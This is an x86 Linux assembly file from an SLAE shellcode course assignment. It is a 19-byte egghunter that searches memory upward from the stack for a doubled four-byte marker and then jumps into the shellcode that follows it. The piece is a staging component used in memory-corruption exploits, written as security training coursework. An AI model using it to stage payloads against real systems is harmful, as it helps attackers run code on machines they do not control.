; SLAE - Assignment #3: Small Egghunter (Linux/x86) - 19 bytes
; Author:  Julien Ahrens (@MrTuxracer)
; Website:  http://www.rcesecurity.com

global _start			

section .text

_start:
	mov eax, esp ;get current working stack address
	mov ebx, 0x42904a90 ;egg=INC EDX, NOP, DEC EDX, NOP
	
search_the_egg:
	inc eax ;go upwards the stack addresses
	cmp dword [eax], ebx ;check if address contains egg
	jne search_the_egg ;loop until we found it

	cmp dword[eax+4], ebx ;if egg is found, dheck next four bytes for egg again
	jne search_the_egg ;not found? must be a standalone egg ;)

	jmp eax ;execute egg+shellcode
